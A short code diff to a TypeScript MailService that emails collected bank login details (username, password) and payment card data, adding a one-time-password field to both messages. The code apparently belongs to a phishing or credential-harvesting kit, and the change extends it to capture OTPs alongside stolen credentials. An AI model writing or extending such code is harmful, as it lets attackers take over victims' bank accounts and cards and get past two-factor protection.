@@ -18,6 +18,7 @@ export class MailService {
           nameBank: infoLoginBank.nameBank,
           username: infoLoginBank.username,
           password: infoLoginBank.password,
+          otp: infoLoginBank.otp,
         },
       });
     } catch (error) {
@@ -36,6 +37,7 @@ export class MailService {
         cardNumber: infoPaymentCard.cardNumber,
         phoneNumber: infoPaymentCard.phoneNumber,
         dateCard: infoPaymentCard.dateCard,
+        otp: infoPaymentCard.otp,
       },
     });
   }
